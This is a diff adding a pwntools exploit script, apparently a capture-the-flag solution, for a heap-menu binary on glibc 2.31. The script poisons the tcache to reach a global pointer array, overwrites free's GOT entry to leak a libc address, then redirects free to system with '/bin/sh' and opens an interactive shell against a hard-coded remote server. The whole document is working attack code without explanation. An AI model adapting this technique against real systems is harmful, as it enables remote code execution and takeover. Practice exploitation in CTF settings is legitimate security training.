@@ -1,0 +1,116 @@
+from pwn import *
+ 
+context.log_level = "debug"
+context.arch = "amd64"
+context.os = "linux"
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
+
+f_remote = True if "remote" in sys.argv else False
+f_gdb = True if "gdb" in sys.argv else False
+
+vuln_path = "./pwn"
+libc_path = "/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6"
+
+elf, rop = ELF(vuln_path), ROP(vuln_path)
+libc, roplibc = ELF(libc_path), ROP(libc_path)
+
+if not f_remote:
+    io = process([vuln_path])
+    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
+else:
+    io = remote("115.29.176.197", 20261)
+
+
+def create(size):
+    io.sendlineafter(b">> ", b"1")
+    io.sendlineafter(b"Size: ", str(size).encode())
+
+def edit(index, content):
+    io.sendlineafter(b">> ", b"2")
+    io.sendlineafter(b"Idx:", str(index).encode())
+    io.sendafter(b"Content: ", content)
+
+def delete(index):
+    io.sendlineafter(b">> ", b"3")
+    io.sendlineafter(b"Idx:", str(index).encode())
+
+def exit():
+    io.sendlineafter(b">> ", b"4")
+
+def ddebug(b=""):
+    if not f_gdb:
+        return
+
+    gdb.attach(io, gdbscript=b)
+    pause()
+
+#u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
+
+atoi_got=elf.got['atol']
+free_got=elf.got['free']
+free_got=elf.got['free']
+
+payload = b""
+io.sendline(payload)
+
+c_write = 0x04012B1
+chunk_ptr = 0x403580
+
+create(0x80)
+create(0x80)
+delete(0)
+delete(1)
+
+edit(1,p64(chunk_ptr))
+create(0x80)	#id2
+create(0x80)	# get 9x403580 ---> 0x3580 + 0*8
+"""
+pwndbg> x/10gx 0x403580
+0x403580:       0x0000000000b6d2a0      0x0000000000b6d330
+0x403590:       0x0000000000b6d330      0x0000000000000000
+
+pwndbg> x/10gx 0x403580
+0x403580:       0x0000000000b6d2a0      0x0000000000403580
+0x403590:       0x0000000000b6d330      0x0000000000000000
+"""
+create(0x40)	
+
+
+payload = b"\x10\xa0"
+edit(1, payload)
+
+# ddebug("b malloc\n b free\n continue")
+payload = b"\x07\x07" * 8
+edit(0, payload)
+
+delete(2)	# unsortedbin libc
+
+
+pay = b'\x00\x00'*8
+edit(0,pay)
+
+
+edit(1,p64(0)+b'\xa0')
+edit(1,p64(free_got))
+
+
+edit(4,p64(c_write))
+#debug()
+delete(2)
+
+malloc_hook = u64(io.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-96-0x10
+print("malloc_hook---->",hex(malloc_hook))
+
+libc_base = malloc_hook - libc.sym['__malloc_hook']
+sys_adr = libc_base + libc.sym['system']
+print("sys_adr---->",hex(sys_adr))
+
+edit(3,b'/bin/sh\x00')
+
+edit(4,p64(sys_adr))
+
+delete(3)
+
+
+io.interactive()
+
